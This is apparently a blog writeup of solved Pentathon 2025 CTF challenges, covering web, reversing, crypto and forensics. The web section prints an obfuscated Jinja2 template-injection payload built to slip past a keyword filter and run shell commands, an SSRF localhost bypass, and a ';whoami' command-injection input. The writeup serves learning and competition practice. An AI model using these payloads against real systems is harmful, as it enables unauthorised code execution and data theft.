---
layout: post
title: "Pentathon 2025 Challenges Writeup"
slug: "pentathon2025"
date: "2025-04-06"
comments: false
categories:
  - hacking
tags:
  - ctf
  - pentathon
  - 2025
  - web
  - reversing
  - forensics
  - crypto
---

This is writeup for the challenges that I have solved in [Pentathon 2025](https://mic.gov.in/pentathon2025/) Stage I.
![pentathon](/images/pentathon2025/pentathon2025.png)

## WEB

### Unblocker [easy]

There is `/flag` path so we use ssrf to access it.
![web_flag](/images/pentathon2025/web_flag_access.png)

Just use `http://2130706433/flag` to localhost and bypass the filter in place that check localhost or 127.0.0.1.
![web_unblocker](/images/pentathon2025/unblocker_flag.png)

### Beyond Borders [medium]
Navigating to the index page we have a form we can submit.
![index](/images/pentathon2025/index.png)

Capturing the request and sending it, we can see that the `name` field is reflected back to us.
![web_beyond](/images/pentathon2025/web_beyond_borders_share.png)

Before trying `sqli` we input characters like `<>` to see if we can do `xss` payload. We also try `{{}}` to check for `ssti` (template injection).

![ssti](/images/pentathon2025/ssti_payload.png)

Sending `{{7*7}}` we get back `49`. So the site is vulnerable to `SSTI`.

After the server blocking some request and either giving us error or not allowed we get some progress using `{{request}}`.
![request](/images/pentathon2025/request.environ.png)

After fiddling around and trying different ways to bypass the filter that checks for code execution we finally get our payload and got RCE.
![filter](/images/pentathon2025/filter_bypass.png)

We now got `flag.txt`
![flag](/images/pentathon2025/got_beyond_flag.png)

Here's our payload.
```txt
name={% set b = request.application[['__glo','bals__'] | join][['__buil','tins__'] | join] %}
{% set i = b[['__impo','rt__'] | join] %}
{% set o = i(['o','s'] | join) %}
{% set p = o[['po','pen'] | join] %}
{% set cmd = ['c','a','t',' ','fl','ag','.txt'] | join %}
{{p(cmd).read()}}
&email=test%40mail.com&message=Test
```

Read more about it at [ssti-onesecurity](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)

### New_Perhaps
Web Hard challenge.
Due to this being the last challenge I solved I didn't get to capture a lot of screenshots.

We register a new user and login using it.
![register](/images/pentathon2025/web_register.png)

After logging in we are greeted with a search page and some results.
![logged_in](/images/pentathon2025/web_logged_in.png)

Trying for `sqli` we get error which shows the code for the search feature.

![sqli](/images/pentathon2025/web_new_perhaps_sqli.png)

We try different payload and check for columns and if we can print any data.
![column](/images/pentathon2025/web_checking_column.png)

We get that the there are 5 columns and we can display data from the 2nd column. So we print the sqllite version.
![sqlite](/images/pentathon2025/web_sqlite_version.png)

Now it's just a matter of enumerating the tables that exists and checking the data there.
Now we get the user table and print the `admin` password.
![table](/images/pentathon2025/get_user_table.png)

We dump the user password and it's `md5` encrypted. 
![admin](/images/pentathon2025/web_get_admin_pass.png)

We decrypt it to get.
```txt
9d4f83d00c4135f98d4097bf7dc0ba79 : Jeff123
```

Log in as `admin:Jeff123`
![dash](/images/pentathon2025/web_admin_dash.png)

We go to the ping tool and execute code.
```bash
127.0.0.1;whoami
```

![rce](/images/pentathon2025/logging_in_rce.png)

> This challenge was way easier than medium ones. 

## Reversing

### ewplusplus [easy]

Using IDA Pro we check the binary. We can see what keys are used to encrypt the username and password.
Check for `key1` and `key2` and also take dump of `enc_username` and `enc_password`. We create a python script to `XOR` the data and get back the username and password.
![ida](/images/pentathon2025/ida_pro_binary.png)

We get username by XOR with key.
```python
enc_username = [
    0x03, 0x0C, 0x05, 0x16, 0x1B, 0x14, 0x1C, 0x07, 0x1E, 0x08,
    0x05, 0x1C, 0x04, 0x0B, 0x10, 0x01, 0x12, 0x12, 0x17, 0x09
]

key = b"nevergonnagiveyouup"  # still 19 bytes

decrypted = ''.join(chr(b ^ key[i % len(key)]) for i, b in enumerate(enc_username))
print("Decrypted username:", decrypted)

```
Decrypted username: mississipiburningggg

```python
enc_password = [
    0x1C, 0x0C, 0x15, 0x0E, 0x5F, 0x06, 0x1C, 0x1A, 0x02, 0x04,
    0x15, 0x08, 0x0D, 0x0A, 0x0E, 0x03, 0x0D, 0x00, 0x02, 0x1C
]

key = b"nevergonnaletyoudown"

decrypted = ''.join(chr(b ^ key[i]) for i, b in enumerate(enc_password))
print("Decrypted password:", decrypted)
```
Decrypted password: rick-astleymysaviour

### Quagmire [medium]
The binary shows us a maze which we must navigate.
![glade](/images/pentathon2025/glade.png)

Opening the binary in `IDA` and then decompiling the code, we can see that valid moves are stored in a memory region.
![valid](/images/pentathon2025/unk_where_valid_moves_are_stored.png)

We go the memory location and dump 1024 bytes from that location,to `valid.txt` as they contain the valid moves.
![dump](/images/pentathon2025/dump_hex.png)

Now we use python script to take those bytes and calculate valid moves for getting to the flag.
```python
from collections import deque

### Load and parse the hex values
##def load_valid_moves(filename):
##    with open(filename) as f:
##        hex_values = f.read().strip().split()
##        byte_values = [int(h, 16) for h in hex_values]
##    
##    # Group into 4-byte chunks
##    v13 = [byte_values[i:i+4] for i in range(0, len(byte_values), 4)]
##    return v13

# handle little endian
def load_valid_moves(filename):
    with open(filename) as f:
        hex_values = f.read().strip().split()
        byte_values = bytes(int(b, 16) for b in hex_values)

    # Parse into 4-byte chunks, little-endian
    v13 = []
    for i in range(0, len(byte_values), 16):
        # Each tile = 4 uint32 values (4 bytes each)
        chunk = byte_values[i:i+16]
        if len(chunk) < 16:
            break
        dirs = [int.from_bytes(chunk[j:j+4], 'little') for j in range(0, 16, 4)]
        v13.append(dirs)

    return v13

# BFS search for the shortest path from 0 to 40
def find_path(v13):
    visited = set()
    queue = deque()
    queue.append((0, ""))  # start at index 0 with empty path

    while queue:
        pos, path = queue.popleft()
        if pos == 40:
            return path

        if pos in visited:
            continue
        visited.add(pos)

        moves = v13[pos]

        # Try each direction
        if moves[3] == 1 and pos % 8 != 7:  # right
            queue.append((pos + 1, path + "d"))
        if moves[0] == 1 and pos % 8 != 0:  # left
            queue.append((pos - 1, path + "a"))
        if moves[2] == 1 and pos <= 55:     # down
            queue.append((pos + 8, path + "s"))
        if moves[1] == 1 and pos > 7:       # up
            queue.append((pos - 8, path + "w"))
    
    return None  # No path found

def main():
    v13 = load_valid_moves("valid.txt")
    path = find_path(v13)
    if path:
        print(f"[+] Found valid path to goal: {path}")
        print(f"[+] Length: {len(path)}")
    else:
        print("[-] No valid path found.")

if __name__ == "__main__":
    main()

```

Now we generate valid moves.
![valid](/images/pentathon2025/valid_moves.png)

Now use that on the binary.
![binary](/images/pentathon2025/solved_moves_quagmire.png)

We get the flag!.

## Crypto

### DES-KEY-Quest [easy]

We are given an encrypted ciphertext.
```text
DES-ECB:e1d5e1fcaae4aba0b735c8fb2ae8797728b073a34b14c57be236c819e6d5f4bbd94f5748ff9d1e008fcad8d403e23d02845a51513bb1e65027ed1bebdcb70973d411a0503cf06c261cb04e1ce1c12925
```

We know that it uses DES and ECB, so we just have to find the key to decrypt the key.
Referring to [Crypto Writeup](https://noob-atbash.github.io/CTF-writeups/cyberwar/crypto/chal-5.html) we create our python script to execute weak DES attack.

```python
from Crypto.Cipher import DES
from binascii import unhexlify

# Hex-encoded DES-ECB ciphertext
ciphertext_hex = "e1d5e1fcaae4aba0b735c8fb2ae8797728b073a34b14c57be236c819e6d5f4bbd94f5748ff9d1e008fcad8d403e23d02845a51513bb1e65027ed1bebdcb70973d411a0503cf06c261cb04e1ce1c12925"
ciphertext = unhexlify(ciphertext_hex)

# List of keys from your original code
keys = [
    b'\x00\x00\x00\x00\x00\x00\x00\x00',
    b'\x1E\x1E\x1E\x1E\x0F\x0F\x0F\x0F',
    b'\xE1\xE1\xE1\xE1\xF0\xF0\xF0\xF0',
    b'\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF'
]

# Attempt decryption with each key
for key in keys:
    cipher = DES.new(key, DES.MODE_ECB)
    plaintext = cipher.decrypt(ciphertext)
    print(f"[+] Trying key: {key.hex()}")
    print(plaintext.decode(errors="ignore"))
    print("-" * 40)

```

![decrypt](/images/pentathon2025/decrypt_crypto_weak.png)


### Mini-RSA [easy]

We are given the following data.
```
p = 13013195056445077675245767987987229724588379930923318266833492046660374216223334270611792324721132438307229159984813414250922197169316235737830919431103659
q = 12930920340230371085700418586571062330546634389230084495106445639925420450591673769061692508272948388121114376587634872733055494744188467315949429674451947
e = 100

c=11088666131394781617390811598165833962057156052691828966096016925228861028679185409394316815975548018250794070969055077333139309027109584093944683716095259744530363271497333029919354127969739854154279296178350939255265615231057970787101017043824900272098312307857766100062991451602725803918772719823329937721
```

And challenge description states that: Decrypting RSA just got a bit more interesting! Don’t forget, you can always simplify 'e'!

So we simplify `e` value and then decrypt the rsa using new values, and convert the numbers to readable ascii.

```python
from Crypto.Util.number import inverse, long_to_bytes
from sympy import gcd

# --- Given RSA parameters ---
p = 13013195056445077675245767987987229724588379930923318266833492046660374216223334270611792324721132438307229159984813414250922197169316235737830919431103659
q = 12930920340230371085700418586571062330546634389230084495106445639925420450591673769061692508272948388121114376587634872733055494744188467315949429674451947
e = 100
c = 110886661313947816173908115981658339620571560526918289660960169252288610286791854093943168159755480182507940709690550773331393090271095840939446837160952597445303632714973330299193541279697398541542792961783509392552656152310579707871010170438249002720983123078577661000629914516027258039187727198233299377218

# --- Compute n and phi(n) ---
n = p * q
phi = (p - 1) * (q - 1)

# --- Factor e = 100 and choose an invertible part ---
# 100 = 25 * 4 => decrypt with e=25 then take 4th root
e_partial = 25
d_partial = inverse(e_partial, phi)

# --- Partially decrypt: result is m^4 ---
m4 = pow(c, d_partial, n)

# --- Integer 4th root (m = (m^4)^(1/4)) ---
def int_nth_root(x, n):
    high = 1
    while high**n <= x:
        high *= 2
    low = high // 2
    while low < high:
        mid = (low + high) // 2
        if mid**n < x:
            low = mid + 1
        else:
            high = mid
    return low if low**n == x else low - 1

m = int_nth_root(m4, 4)

# --- Convert to plaintext ---
plaintext = long_to_bytes(m)
print(plaintext.decode(errors='ignore'))
```
Run this and you will get the flag.

### Master of Miniscule [easy]

Another easy crypto challenge.
We are given the following output:
```txt
n=16762077095801589672314890427869401187164086916344025478190347015681606276350033764791052494634438743687378102302129876469874629401611476115475741216444937553471054356393134540670817836743767583241290027522501016180585699330112702613161730012176085574743462096939111910613507008960837373716627558251940473661478520417826486527958422713970123527171162093407894286630360257132145754982872704536638681505413861494861497793838069021603881655804866695522655064013867284791862099373846594743596668718076555604173830911320344662327626095423734160003409379162445204425515220005854125716129645038092738757407899378631925818639
e=3
ct=710289350683868503644597519669917810036866060097512736293170169932115475815119142207293435658975273721020114420910211496808786789
```

We decrypt it using the following python code.
```python
from sympy import integer_nthroot
from Crypto.Util.number import long_to_bytes

n = 16762077095801589672314890427869401187164086916344025478190347015681606276350033764791052494634438743687378102302129876469874629401611476115475741216444937553471054356393134540670817836743767583241290027522501016180585699330112702613161730012176085574743462096939111910613507008960837373716627558251940473661478520417826486527958422713970123527171162093407894286630360257132145754982872704536638681505413861494861497793838069021603881655804866695522655064013867284791862099373846594743596668718076555604173830911320344662327626095423734160003409379162445204425515220005854125716129645038092738757407899378631925818639
e = 3
ct = 710289350683868503644597519669917810036866060097512736293170169932115475815119142207293435658975273721020114420910211496808786789

# Cube root of ciphertext
m, exact = integer_nthroot(ct, e)

if exact:
    plaintext = long_to_bytes(m)
    print("[+] Decrypted plaintext:")
    print(plaintext.decode())
else:
    print("[-] Failed: m^e > N, or padding used.")

```
## Forensics
### Last Transmission
We are give a `pcap` fiele and upon analysis.
![last](/images/pentathon2025/last_transmission_forensics_udp.png)

Decrypting the `base64` encoded values we get a key and another string.

Since there are lots of ICMP request between the two host and packets length is greater than 40. We suspect ICMP request smuggling.
![icmp](/images/pentathon2025/icmp_request_between_two_host.png)

```bash
> tshark -r new_chall.pcap -Y "icmp.type == 8 && ip.src == 192.168.1.100 && frame.len > 40" -T fields -e data > icmp_data.txt
```
We dump all the data into a txt file and use the key we got from previous udp transfer as key and IV. We use those values to decrypt the ICMP smuggled data.

![file](/images/pentathon2025/png_file_type.png)

```python
from base64 import b64decode
from binascii import unhexlify
from Crypto.Cipher import AES

# Your key and IV
key = b64decode("Ujl0IUptNExhQEJxWGUyUG8jV2MlVXlOczdEa0h2WmY=")
iv = b64decode("TGtKaEdmRHNBelhjVmJObQ==")

# Read hex data from file as text
with open("icmp_data.txt", "r") as f:
    hex_data = "".join(line.strip() for line in f if line.strip())

# Convert hex to raw bytes
ciphertext = unhexlify(hex_data)

# AES decryption (try CBC first)
cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = cipher.decrypt(ciphertext)

# Optional: Remove PKCS#7 padding if needed
pad_len = plaintext[-1]
if pad_len < 16:
    plaintext = plaintext[:-pad_len]

# Try decoding to UTF-8 text
try:
    print(plaintext.decode("utf-8"))
except UnicodeDecodeError:
    print("[!] Decryption worked but output is not clean UTF-8:")
    print(plaintext)

# Save decrypted content to file
with open("output.png", "wb") as img_file:
    img_file.write(plaintext)

print("[+] PNG image saved as 'output.png'")

```

![output](/images/pentathon2025/output.png)

### Hidden Source
After opening the `.ad1` file in `ftk imager` we go through the files and got powershell history.
![ftk](/images/pentathon2025/ftk_psReadline.png)

After decoding the `base64` encoded string we get part of the flag.
```txt
part2 : _l1ng3r5s_everywh3re33
```

We got an important pdf from documents.
![important](/images/pentathon2025/ftk_important.pdf.png)

The file gives error when trying to open.
![error](/images/pentathon2025/ftk_important_not_open.png)

But we can open it on linux and get third part of the flag. Must be some header issues on windows and other pdf viewer.
![flag](/images/pentathon2025/important_flag.png)

Fixed the pdf using hexedit to correct the magic headers.
![hexedit](/images/pentathon2025/hexedit_importantPdf.png)

flag: _4r0und_0mg_0x3457}

Two other `png` challenges where we have to edit the `headers`,`IDAT`,`CRC` were also present but couldn't complete those challenges in time. GG

Team Ranking
![rank](/images/pentathon2025/rank.png)